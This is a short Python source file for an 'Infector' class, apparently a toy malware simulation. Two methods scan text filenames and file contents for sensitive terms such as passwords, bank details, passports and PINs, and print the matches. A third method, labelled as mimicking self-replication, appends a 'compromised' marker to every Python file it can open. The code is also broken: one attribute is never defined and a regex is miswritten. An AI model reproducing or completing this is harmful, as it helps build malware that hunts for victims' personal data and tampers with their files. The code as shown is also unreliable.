import os
import re
import pathlib
from filehelper import FileHelper


class Infector:
    def __init__(self):
        self.fileHelper = FileHelper()

    def findVulnerableFileNames(self):
        temp = 0
        vulnerablestrings = [
            "password",
            "account",
            "statement",
            "bank",
            "passport",
            "drivers liscense",
            "pin",
        ]
        for file in self.fileHelper.findAllFiles("txt"):
            temp = file[::-1].split("\\")[0]
            filename = temp[temp.find(".") + 1 :][::-1]
            for string in vulnerablestrings:
                x = re.findall("(?i)({}):*s*".format(string), filename)
                if x != []:
                    print(x)

    def findVulnerablitiesInTxt(self, file):
        sentences = [x.strip() for x in open(file, "r").readlines()]
        vulnerablestrings = [
            "password",
            "account",
            "statement",
            "bank",
            "passport",
            "drivers liscense",
            "pin",
        ]
        for sentence in sentences:
            for string in vulnerablestrings:
                x = re.findall("(?i)({}):*s*".format(string), sentence)
                if x != []:
                    print(x)

    def infectPyFiles(self):  # mimics self replication
        print(self.files["py"])
        for file in self.files["py"]:
            try:
                FH = open(file, "a")
                FH.write("\n" + """#comprimised""")
                FH.close()
            except:
                pass